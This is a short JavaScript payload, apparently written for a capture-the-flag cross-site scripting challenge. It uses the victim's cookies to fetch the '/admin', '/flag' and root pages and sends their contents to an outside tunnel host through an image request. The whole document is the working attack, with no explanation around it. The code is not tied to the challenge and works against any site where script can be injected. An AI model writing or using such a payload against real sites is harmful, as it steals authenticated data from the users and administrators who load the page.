(function () {
  function exfil(path) {
    return fetch(path, { credentials: 'include' })
      .then(r => r.text())
      .then(t => {
        new Image().src =
          'https://ACA22F9BA15D3853-185-240-49-214.serveousercontent.com/?d=' +
          encodeURIComponent('PATH=' + path + '\n' + t);
      });
  }

  exfil('/admin').catch(() => {});
  exfil('/flag').catch(() => {});
  exfil('/').catch(() => {});
})();
